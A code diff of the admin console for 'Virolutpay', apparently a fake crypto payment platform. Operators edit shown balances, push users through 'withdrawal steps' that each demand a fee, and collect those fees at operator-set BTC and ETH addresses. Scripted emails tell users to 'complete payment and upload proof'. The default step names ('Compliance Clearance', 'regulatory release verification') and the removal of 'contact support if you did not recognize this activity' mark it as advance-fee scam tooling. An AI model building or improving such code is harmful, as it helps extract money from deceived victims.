@@ -586,24 +586,31 @@
         </div>
         <div class="form-group">
           <label class="form-label">BTC Wallet Address (Editable)</label>
-          <input type="text" id="adminBtcInput" class="form-control" />
+          <input type="text" id="adminBtcInput" class="form-control" placeholder="Enter BTC deposit/settlement address" />
         </div>
         <div class="form-group">
           <label class="form-label">ETH Wallet Address (Editable)</label>
-          <input type="text" id="adminEthInput" class="form-control" />
+          <input type="text" id="adminEthInput" class="form-control" placeholder="Enter ETH deposit/settlement address" />
         </div>
-        <button type="button" class="btn-secondary" onclick="saveCryptoAddresses()">Save Wallet Addresses</button>
+        <button type="button" class="btn-primary" onclick="saveCryptoAddresses()">
+          <i class="fa-solid fa-floppy-disk"></i> Save Wallet Addresses
+        </button>
       </div>
 
       <!-- 6. Withdrawal Steps & Countdown Timer -->
       <div class="admin-card">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; gap:8px; flex-wrap:wrap;">
           <span style="font-size:13.5px; font-weight:800; color:#34d399;">
             <i class="fa-solid fa-list-check"></i> Withdrawal Steps &amp; Countdown Timer
           </span>
           <button type="button" class="copy-mini-btn" onclick="addNewWithdrawalStep()">+ Add Step</button>
         </div>
         <div id="adminStepsEditor"></div>
+        <div style="margin-top:8px;">
+          <button type="button" class="btn-primary" onclick="saveAllStepsChanges()">
+            <i class="fa-solid fa-floppy-disk"></i> Save All Step Changes
+          </button>
+        </div>
         <div id="adminStepsSeeMoreWrap" style="margin-top:8px; display:none;">
           <button type="button" class="btn-secondary" id="adminStepsSeeMoreBtn" onclick="toggleAdminShowAllSteps()">
             See More Steps
@@ -694,7 +701,8 @@
     let adminSelectedChatEmail = "";
     let unsubConfig = null;
     let unsubUsers = null;
-    let pendingConfirmResolver = null;
+    let walletsInitialized = false;
+    let stepsInitialized = false;
 
     function notify(msg) {
       const el = document.getElementById("toast");
@@ -726,14 +734,11 @@
       backdrop.classList.add("open");
 
       return new Promise((resolve) => {
-        pendingConfirmResolver = resolve;
-
         const cleanup = (result) => {
           backdrop.classList.remove("open");
           okBtn.removeEventListener("click", onOk);
           cancelBtn.removeEventListener("click", onCancel);
           backdrop.removeEventListener("click", onBackdrop);
-          pendingConfirmResolver = null;
           resolve(result);
         };
 
@@ -786,12 +791,12 @@
         case "money_received":
           return {
             subject: `Virolutpay Credit Alert: $${amt} USD Received`,
-            body: `Hello ${name},\n\nWe have credited $${amt} USD to your Virolutpay account (${ref}).${note}\n\nIf you have any questions, reply to this message or contact our support team.\n\n— Virolutpay Operations`
+            body: `Hello ${name},\n\nWe have credited $${amt} USD to your Virolutpay account (${ref}).${note}\n\n— Virolutpay Operations`
           };
         case "money_sent":
           return {
             subject: `Virolutpay Debit Alert: $${amt} USD Processed`,
-            body: `Hello ${name},\n\nA debit of $${amt} USD has been recorded on your Virolutpay account (${ref}).${note}\n\nIf you did not recognize this activity, please contact support immediately.\n\n— Virolutpay Operations`
+            body: `Hello ${name},\n\nA debit of $${amt} USD has been recorded on your Virolutpay account (${ref}).${note}\n\n— Virolutpay Operations`
           };
         case "withdrawal_update":
         default:
@@ -862,6 +867,12 @@
     }
 
     window.saveMakeSettings = async function() {
+      const ok = await confirmAdminAction("Save Make.com webhook and sender email settings?", {
+        title: "Save Make Settings",
+        confirmText: "Save Settings"
+      });
+      if (!ok) return;
+
       appConfig.makeWebhookUrl = document.getElementById("makeWebhookUrlInput").value.trim();
       appConfig.makeFromEmail = document.getElementById("makeFromEmailInput").value.trim() || "noreply@virolutpay.com";
       appConfig.makeReplyToEmail = document.getElementById("makeReplyToInput").value.trim() || "support@virolutpay.com";
@@ -875,23 +886,33 @@
         notify("Enter your Make.com Webhook URL first.");
         return;
       }
+      const ok = await confirmAdminAction("Send a test webhook payload to Make.com now?", {
+        title: "Send Test Payload",
+        confirmText: "Send Test"
+      });
+      if (!ok) return;
+
       appConfig.makeWebhookUrl = hookUrl;
       appConfig.makeFromEmail = document.getElementById("makeFromEmailInput").value.trim() || "noreply@virolutpay.com";
       appConfig.makeReplyToEmail = document.getElementById("makeReplyToInput").value.trim() || "support@virolutpay.com";
       await persistConfig();
 
+      const firstStep = appConfig.steps?.[0] || DEFAULT_CONFIG.steps[0];
       const target = allUsers.find(u => u.email === adminSelectedChatEmail) || allUsers[0] || {
         name: "Admin Test",
         email: appConfig.makeReplyToEmail || "support@virolutpay.com",
         walletId: "TEST-WALLET"
       };
 
-      await sendMakeNotification("money_received", target, {
-        amountUsd: 25,
-        statusLabel: "Test Notification Delivered",
-        note: "From Virolutpay Admin Control Center"
+      await sendMakeNotification("withdrawal_update", target, {
+        amountUsd: 100,
+        statusLabel: "Withdrawal Initiated — Step 1 Proof Required",
+        step: 1,
+        actionNeeded: firstStep.description || "Complete Step 1 and upload payment proof",
+        requiredAmount: `$${Number(firstStep.priceUsd || 50).toFixed(2)} USD`,
+        note: "Test withdrawal notification from Virolutpay Admin"
       });
-      notify(`Test payload sent to Make for ${target.email}.`);
+      notify(`Test withdrawal_update payload sent to Make for ${target.email}.`);
     };
 
     function appendTx(userData, type, title, subtitle, amountUsd, status, extra = {}) {
@@ -932,14 +953,16 @@
     };
 
     window.adminLogout = async function() {
-      const ok = await confirmAdminAction(
-        "Lock and sign out of the Admin Control Center?",
-        { title: "Confirm Sign Out", confirmText: "Sign Out" }
-      );
+      const ok = await confirmAdminAction("Lock and sign out of the Admin Control Center?", {
+        title: "Confirm Sign Out",
+        confirmText: "Sign Out"
+      });
       if (!ok) return;
 
       if (unsubConfig) { unsubConfig(); unsubConfig = null; }
       if (unsubUsers) { unsubUsers(); unsubUsers = null; }
+      walletsInitialized = false;
+      stepsInitialized = false;
       await signOut(auth);
       notify("Signed out.");
     };
@@ -955,7 +978,7 @@
       if (el) el.textContent = `${count} unread`;
     }
 
-    function renderAdminPanel() {
+    function renderAdminPanel(forceSyncInputs = false) {
       document.getElementById("makeWebhookUrlInput").value = appConfig.makeWebhookUrl || "";
       document.getElementById("makeFromEmailInput").value = appConfig.makeFromEmail || "noreply@virolutpay.com";
       document.getElementById("makeReplyToInput").value = appConfig.makeReplyToEmail || "support@virolutpay.com";
@@ -964,8 +987,12 @@
         hookBadge.textContent = appConfig.makeWebhookUrl ? "Configured" : "Not Set";
       }
 
-      document.getElementById("adminBtcInput").value = appConfig.btcAddress || DEFAULT_BTC_ADDRESS;
-      document.getElementById("adminEthInput").value = appConfig.ethAddress || "";
+      if (!walletsInitialized || forceSyncInputs) {
+        document.getElementById("adminBtcInput").value = appConfig.btcAddress || DEFAULT_BTC_ADDRESS;
+        document.getElementById("adminEthInput").value = appConfig.ethAddress || "";
+        walletsInitialized = true;
+      }
+
       document.getElementById("adminTotalUsersBadge").textContent = `${allUsers.length} user${allUsers.length === 1 ? "" : "s"}`;
 
       renderAdminPendingWithdrawals();
@@ -973,7 +1000,10 @@
       renderAdminMessenger();
       renderAdminUsersList();
       renderAdminPlatformsList();
-      renderAdminStepsEditor();
+      if (!stepsInitialized || forceSyncInputs) {
+        renderAdminStepsEditor();
+        stepsInitialized = true;
+      }
       updateUnreadBadge();
     }
 
@@ -1037,6 +1067,7 @@
               <strong>${u.name || "User"}</strong> (${u.email || ""}) • <span style="color:#93c5fd;">${u.walletId || uid.slice(0, 8)}</span><br/>
               <strong>Withdrawal:</strong> $${Number(wd.amountUsd || 0).toFixed(2)} USD → ${wd.destinationLabel || ""}<br/>
               <strong>Stage:</strong> <span style="color:#fbbf24;">Step ${stepNum}${step ? ` — ${step.title}` : ""}</span><br/>
+              <strong>Required Amount:</strong> <span style="color:#34d399;">$${curPrice.toFixed(2)} USD</span><br/>
               <strong>Status:</strong> <span style="color:${isReviewed ? "#60a5fa" : "#f87171"}; font-weight:700;">${String(wd.status || "").replace(/_/g, " ").toUpperCase()}</span> <span style="font-size:11px; color:var(--text-muted);">(${statusTimeText})</span>
             </div>
 
@@ -1108,8 +1139,8 @@
       const wd = u.activeWithdrawal;
       const amt = Number(wd.amountUsd || 0);
       const ok = await confirmAdminAction(
-        `Mark $${amt.toFixed(2)} USD withdrawal for ${u.name || u.email} as COMPLETED on the user's screen?`,
-        { title: "Approve Full Withdrawal", confirmText: "Mark Completed" }
+        `Are you sure you want to mark ${u.name || u.email}'s $${amt.toFixed(2)} USD withdrawal as COMPLETED on the user's screen?`,
+        { title: "Approve & Complete Withdrawal", confirmText: "Yes, Mark Completed" }
       );
       if (!ok) return;
 
@@ -1145,7 +1176,7 @@
         statusLabel: "Withdrawal Approved — Completed",
         step: (wd.stepIndex || 0) + 1,
         stepApproved: true,
-        actionNeeded: "No further action required — funds have been completed",
+        actionNeeded: "No further action required — your withdrawal is completed",
         requiredAmount: "$0.00",
         note: "Your withdrawal has been approved and marked Completed"
       });
@@ -1160,8 +1191,8 @@
       if (!u || !u.activeWithdrawal || !targetStep) return;
 
       const ok = await confirmAdminAction(
-        `Move ${u.name || u.email} to Step ${targetIdx + 1} (${targetStep.title} — $${Number(targetStep.priceUsd).toFixed(2)} USD)?`,
-        { title: "Confirm Step Override", confirmText: "Set Step" }
+        `Are you sure you want to move ${u.name || u.email} to Step ${targetIdx + 1} (${targetStep.title} — $${Number(targetStep.priceUsd).toFixed(2)} USD)?`,
+        { title: "Confirm Step Change", confirmText: "Yes, Set Step" }
       );
       if (!ok) return;
 
@@ -1196,7 +1227,7 @@
 
       await sendMakeNotification("withdrawal_update", u, {
         amountUsd: wd.amountUsd || targetStep.priceUsd,
-        statusLabel: `Moved to Step ${targetIdx + 1}: ${targetStep.title}`,
+        statusLabel: `Step ${targetIdx + 1} (${targetStep.title}) — Proof Required`,
         step: targetIdx + 1,
         actionNeeded: targetStep.description || `Complete Step ${targetIdx + 1} and upload payment proof`,
         requiredAmount: `$${Number(targetStep.priceUsd || 0).toFixed(2)} USD`
@@ -1213,8 +1244,8 @@
       if (!u || !u.activeWithdrawal) return;
 
       const ok = await confirmAdminAction(
-        `Update required step fee for ${u.name || u.email} to $${newPrice.toFixed(2)} USD?`,
-        { title: "Confirm Fee Update", confirmText: "Update Fee" }
+        `Are you sure you want to update the required step fee for ${u.name || u.email} to $${newPrice.toFixed(2)} USD?`,
+        { title: "Confirm Fee Update", confirmText: "Yes, Update Fee" }
       );
       if (!ok) return;
 
@@ -1242,9 +1273,9 @@
 
       await sendMakeNotification("withdrawal_update", u, {
         amountUsd: wd.amountUsd || newPrice,
-        statusLabel: `Step ${(wd.stepIndex || 0) + 1} Fee Updated to $${newPrice.toFixed(2)} USD`,
+        statusLabel: `Step ${(wd.stepIndex || 0) + 1} Required Amount: $${newPrice.toFixed(2)} USD`,
         step: (wd.stepIndex || 0) + 1,
-        actionNeeded: `Pay the updated step amount of $${newPrice.toFixed(2)} USD and upload payment proof`,
+        actionNeeded: `Complete payment of $${newPrice.toFixed(2)} USD and upload proof`,
         requiredAmount: `$${newPrice.toFixed(2)} USD`
       });
       notify(`Updated fee to $${newPrice.toFixed(2)} USD (${updatedAt}).`);
@@ -1265,16 +1296,18 @@
       const stepNum = (wd.stepIndex || 0) + 1;
       const nextStep = appConfig.steps[stepNum] || null;
       const ok = await confirmAdminAction(
-        `Approve Step ${stepNum} (${step ? step.title : `Step ${stepNum}`}) proof for ${u.name || u.email}?`,
-        { title: "Approve Step Proof", confirmText: "Approve Proof" }
+        `Are you sure you want to APPROVE Step ${stepNum} (${step ? step.title : `Step ${stepNum}`}) proof for ${u.name || u.email}?`,
+        { title: "Confirm Proof Approval", confirmText: "Yes, Approve Proof" }
       );
       if (!ok) return;
 
       const mins = Number(step && step.delayMinutes !== undefined ? step.delayMinutes : DEFAULT_COUNTDOWN_MINUTES);
       const effectiveMins = mins > 0 ? Math.min(DEFAULT_COUNTDOWN_MINUTES, mins) : DEFAULT_COUNTDOWN_MINUTES;
-      const headline = step && step.title
-        ? `${step.title} approved, withdrawing in progress`
-        : `Step ${stepNum} approved, withdrawing in progress`;
+      const headline = (step && step.postApprovalStatus)
+        ? step.postApprovalStatus
+        : (step && step.title
+          ? `${step.title} approved, withdrawing in progress`
+          : `Step ${stepNum} approved, withdrawing in progress`);
       const updatedAt = nowClockString();
 
       const nextWd = {
@@ -1308,7 +1341,7 @@
         step: stepNum,
         stepApproved: true,
         actionNeeded: nextStep
-          ? `Step ${stepNum} approved; prepare for Step ${stepNum + 1} (${nextStep.title})`
+          ? `${nextStep.title}: ${nextStep.description || "Complete next step and upload proof"}`
           : "Step approved; withdrawal processing in progress",
         requiredAmount: nextStep ? `$${Number(nextStep.priceUsd || 0).toFixed(2)} USD` : "$0.00"
       });
@@ -1324,8 +1357,8 @@
       if (!u || !u.activeWithdrawal || !u.activeWithdrawal.receiptDataUrl) return;
 
       const ok = await confirmAdminAction(
-        `Reject payment proof for ${u.name || u.email}? Reason: "${note}"`,
-        { title: "Reject Payment Proof", confirmText: "Reject Proof", danger: true }
+        `Are you sure you want to REJECT payment proof for ${u.name || u.email}? Reason: "${note}"`,
+        { title: "Confirm Proof Rejection", confirmText: "Yes, Reject Proof", danger: true }
       );
       if (!ok) return;
 
@@ -1362,7 +1395,7 @@
 
       await sendMakeNotification("withdrawal_update", u, {
         amountUsd: wd.amountUsd || 0,
-        statusLabel: `Step ${stepNum} Proof Rejected`,
+        statusLabel: `Step ${stepNum} Proof Rejected — Action Required`,
         step: stepNum,
         stepApproved: false,
         actionNeeded: `Re-upload valid payment proof for Step ${stepNum}`,
@@ -1379,8 +1412,8 @@
 
       const refundAmt = Number(u.activeWithdrawal.amountUsd || 0);
       const ok = await confirmAdminAction(
-        `Dismiss this withdrawal and refund $${refundAmt.toFixed(2)} USD back to ${u.name || u.email}'s balance?`,
-        { title: "Dismiss & Refund Withdrawal", confirmText: "Dismiss & Refund", danger: true }
+        `Are you sure you want to DISMISS this withdrawal and refund $${refundAmt.toFixed(2)} USD back to ${u.name || u.email}?`,
+        { title: "Confirm Dismiss & Refund", confirmText: "Yes, Dismiss & Refund", danger: true }
       );
       if (!ok) return;
 
@@ -1612,8 +1645,8 @@
 
       const actionWord = mode === "credit" ? "Credit" : "Debit";
       const ok = await confirmAdminAction(
-        `${actionWord} $${amt.toFixed(2)} USD ${mode === "credit" ? "to" : "from"} ${u.name || u.email}?`,
-        { title: `Confirm ${actionWord}`, confirmText: `${actionWord} User`, danger: mode === "debit" }
+        `Are you sure you want to ${actionWord.toLowerCase()} $${amt.toFixed(2)} USD ${mode === "credit" ? "to" : "from"} ${u.name || u.email}?`,
+        { title: `Confirm ${actionWord}`, confirmText: `Yes, ${actionWord}`, danger: mode === "debit" }
       );
       if (!ok) return;
 
@@ -1649,8 +1682,8 @@
       const u = allUsers.find(item => item._docId === uid);
       const stepVal = parseInt(document.getElementById(stepInputId).value, 10) || 1;
       const ok = await confirmAdminAction(
-        `Set withdrawal step to ${stepVal} for ${u ? (u.name || u.email) : uid}?`,
-        { title: "Confirm Step Change", confirmText: "Set Step" }
+        `Are you sure you want to set withdrawal step to ${stepVal} for ${u ? (u.name || u.email) : uid}?`,
+        { title: "Confirm Step Change", confirmText: "Yes, Set Step" }
       );
       if (!ok) return;
 
@@ -1662,8 +1695,8 @@
       const uid = decodeURIComponent(encodedUid);
       const u = allUsers.find(item => item._docId === uid);
       const ok = await confirmAdminAction(
-        `Permanently delete user account ${u ? `${u.name || "User"} (${u.email || uid})` : uid} from Firestore? This cannot be undone.`,
-        { title: "Delete User Account", confirmText: "Delete User", danger: true }
+        `Are you sure you want to permanently DELETE ${u ? `${u.name || "User"} (${u.email || uid})` : uid}?`,
+        { title: "Delete User Account", confirmText: "Yes, Delete User", danger: true }
       );
       if (!ok) return;
 
@@ -1679,8 +1712,8 @@
       if (!name || !url) return;
 
       const ok = await confirmAdminAction(
-        `Add "${name}" (${url}) to Trusted Buying Platforms?`,
-        { title: "Add Buying Platform", confirmText: "Add Platform" }
+        `Are you sure you want to add "${name}" to Trusted Buying Platforms?`,
+        { title: "Add Buying Platform", confirmText: "Yes, Add Platform" }
       );
       if (!ok) return;
 
@@ -1694,8 +1727,8 @@
     window.removeBuyingPlatform = async function(idx) {
       const plat = appConfig.buyingPlatforms?.[idx];
       const ok = await confirmAdminAction(
-        `Remove "${plat ? plat.name : "this platform"}" from Trusted Buying Platforms?`,
-        { title: "Remove Platform", confirmText: "Remove", danger: true }
+        `Are you sure you want to remove "${plat ? plat.name : "this platform"}"?`,
+        { title: "Remove Platform", confirmText: "Yes, Remove", danger: true }
       );
       if (!ok) return;
 
@@ -1725,53 +1758,100 @@
     }
 
     window.saveCryptoAddresses = async function() {
-      appConfig.btcAddress = document.getElementById("adminBtcInput").value.trim() || DEFAULT_BTC_ADDRESS;
-      appConfig.ethAddress = document.getElementById("adminEthInput").value.trim();
+      const btcVal = document.getElementById("adminBtcInput").value.trim() || DEFAULT_BTC_ADDRESS;
+      const ethVal = document.getElementById("adminEthInput").value.trim();
+      const ok = await confirmAdminAction(
+        "Are you sure you want to save these updated BTC & ETH wallet addresses?",
+        { title: "Save Wallet Addresses", confirmText: "Yes, Save Wallets" }
+      );
+      if (!ok) return;
+
+      appConfig.btcAddress = btcVal;
+      appConfig.ethAddress = ethVal;
       await persistConfig();
       notify("BTC & ETH wallet addresses saved.");
     };
 
-    window.updateStepField = async function(idx, field, val) {
-      appConfig.steps[idx][field] = val;
+    function collectStepsFromInputs() {
+      const total = (appConfig.steps || []).length;
+      for (let idx = 0; idx < total; idx++) {
+        const titleEl = document.getElementById(`stepTitle_${idx}`);
+        const descEl = document.getElementById(`stepDesc_${idx}`);
+        const priceEl = document.getElementById(`stepPrice_${idx}`);
+        const delayEl = document.getElementById(`stepDelay_${idx}`);
+        const postEl = document.getElementById(`stepPostStatus_${idx}`);
+        const walletEl = document.getElementById(`stepWallet_${idx}`);
+
+        if (titleEl) appConfig.steps[idx].title = titleEl.value.trim() || `Step ${idx + 1}`;
+        if (descEl) appConfig.steps[idx].description = descEl.value.trim();
+        if (priceEl) appConfig.steps[idx].priceUsd = Math.max(0, parseFloat(priceEl.value) || 0);
+        if (delayEl) {
+          const parsedDelay = parseFloat(delayEl.value);
+          appConfig.steps[idx].delayMinutes = parsedDelay > 0 ? Math.min(DEFAULT_COUNTDOWN_MINUTES, parsedDelay) : DEFAULT_COUNTDOWN_MINUTES;
+        }
+        if (postEl) {
+          appConfig.steps[idx].postApprovalStatus = postEl.value.trim() || `${appConfig.steps[idx].title} approved, withdrawing in progress`;
+        }
+        if (walletEl) {
+          appConfig.steps[idx].settlementAddress = walletEl.value.trim() || appConfig.btcAddress || DEFAULT_BTC_ADDRESS;
+        }
+      }
+    }
+
+    window.saveAllStepsChanges = async function() {
+      collectStepsFromInputs();
+      const ok = await confirmAdminAction(
+        "Are you sure you want to save all changes to the withdrawal steps?",
+        { title: "Save Withdrawal Steps", confirmText: "Yes, Save Steps" }
+      );
+      if (!ok) return;
+
       await persistConfig();
-      notify(`Step ${idx + 1} updated.`);
+      renderAdminStepsEditor();
+      notify("All withdrawal step changes saved.");
     };
 
     window.addNewWithdrawalStep = async function() {
+      collectStepsFromInputs();
       const num = appConfig.steps.length + 1;
       const ok = await confirmAdminAction(
-        `Add Step ${num} to the withdrawal steps list?`,
-        { title: "Add Withdrawal Step", confirmText: "Add Step" }
+        `Are you sure you want to add Step ${num}? You can edit its title, explanation, amount, timer, and post-approval status right after.`,
+        { title: "Add Withdrawal Step", confirmText: "Yes, Add Step" }
       );
       if (!ok) return;
 
       appConfig.steps.push({
         id: "step_" + Date.now(),
-        title: `Compliance Clearance ${num}`,
-        description: "Mandatory regulatory release verification prior to final bank settlement.",
-        priceUsd: 85,
+        title: `Verification Step ${num}`,
+        description: "Complete this verification step and upload payment proof to continue.",
+        priceUsd: 50,
         settlementAddress: appConfig.btcAddress || DEFAULT_BTC_ADDRESS,
-        postApprovalStatus: `Compliance Clearance ${num} approved, withdrawing in progress`,
+        postApprovalStatus: `Verification Step ${num} approved, withdrawing in progress`,
         delayMinutes: DEFAULT_COUNTDOWN_MINUTES
       });
       await persistConfig();
-      notify(`Added Step ${num}.`);
+      adminShowAllSteps = true;
+      renderAdminStepsEditor();
+      notify(`Added Step ${num}. Edit its details and tap Save All Step Changes.`);
     };
 
     window.deleteWithdrawalStep = async function(idx) {
+      collectStepsFromInputs();
       const st = appConfig.steps?.[idx];
       const ok = await confirmAdminAction(
-        `Delete Step ${idx + 1}${st ? ` ("${st.title}")` : ""}?`,
-        { title: "Delete Step", confirmText: "Delete Step", danger: true }
+        `Are you sure you want to delete Step ${idx + 1}${st ? ` ("${st.title}")` : ""}?`,
+        { title: "Delete Step", confirmText: "Yes, Delete Step", danger: true }
       );
       if (!ok) return;
 
       appConfig.steps.splice(idx, 1);
       await persistConfig();
+      renderAdminStepsEditor();
       notify("Step removed.");
     };
 
     window.toggleAdminShowAllSteps = function() {
+      collectStepsFromInputs();
       adminShowAllSteps = !adminShowAllSteps;
       renderAdminStepsEditor();
     };
@@ -1792,25 +1872,29 @@
           </div>
           <div class="form-group">
             <label class="form-label">Step Title</label>
-            <input type="text" class="form-control" value="${st.title || ""}" onchange="updateStepField(${idx}, 'title', this.value)" />
+            <input type="text" id="stepTitle_${idx}" class="form-control" value="${st.title || ""}" />
           </div>
           <div class="form-group">
-            <label class="form-label">Action Description</label>
-            <input type="text" class="form-control" value="${st.description || ""}" onchange="updateStepField(${idx}, 'description', this.value)" />
+            <label class="form-label">Step Explanation / Action Needed</label>
+            <input type="text" id="stepDesc_${idx}" class="form-control" value="${st.description || ""}" />
+          </div>
+          <div class="form-group">
+            <label class="form-label">Status Shown After Step Is Approved</label>
+            <input type="text" id="stepPostStatus_${idx}" class="form-control" value="${st.postApprovalStatus || `${st.title || `Step ${idx + 1}`} approved, withdrawing in progress`}" />
           </div>
           <div class="grid-2">
             <div class="form-group">
-              <label class="form-label">Step Charge (USD)</label>
-              <input type="number" class="form-control" value="${st.priceUsd ?? 0}" step="0.01" onchange="updateStepField(${idx}, 'priceUsd', parseFloat(this.value) || 0)" />
+              <label class="form-label">Required Amount (USD)</label>
+              <input type="number" id="stepPrice_${idx}" class="form-control" value="${st.priceUsd ?? 0}" step="0.01" min="0" />
             </div>
             <div class="form-group">
               <label class="form-label">Timer (Mins, Max 3)</label>
-              <input type="number" class="form-control" value="${st.delayMinutes ?? DEFAULT_COUNTDOWN_MINUTES}" step="0.5" min="0.1" max="3" onchange="updateStepField(${idx}, 'delayMinutes', Math.min(3, parseFloat(this.value) || 3))" />
+              <input type="number" id="stepDelay_${idx}" class="form-control" value="${st.delayMinutes ?? DEFAULT_COUNTDOWN_MINUTES}" step="0.5" min="0.1" max="3" />
             </div>
           </div>
           <div class="form-group" style="margin-bottom:0;">
-            <label class="form-label">Settlement Wallet Address</label>
-            <input type="text" class="form-control" value="${st.settlementAddress || ""}" onchange="updateStepField(${idx}, 'settlementAddress', this.value)" />
+            <label class="form-label">Settlement Wallet Address (Editable)</label>
+            <input type="text" id="stepWallet_${idx}" class="form-control" value="${st.settlementAddress || ""}" />
           </div>
         </div>
       `).join("");
@@ -1850,15 +1934,17 @@
               steps: Array.isArray(d.steps) && d.steps.length ? d.steps : structuredClone(DEFAULT_CONFIG.steps)
             };
           }
-          renderAdminPanel();
+          renderAdminPanel(false);
         });
 
         unsubUsers = onSnapshot(collection(db, "users"), (snap) => {
           allUsers = snap.docs.map(docItem => ({ _docId: docItem.id, ...docItem.data() }));
-          renderAdminPanel();
+          renderAdminPanel(false);
         });
       } else {
         if (user) await signOut(auth);
+        walletsInitialized = false;
+        stepsInitialized = false;
         document.getElementById("adminLoginCard").style.display = "block";
         document.getElementById("adminPanel").style.display = "none";
         document.getElementById("adminLogoutBtn").style.display = "none";
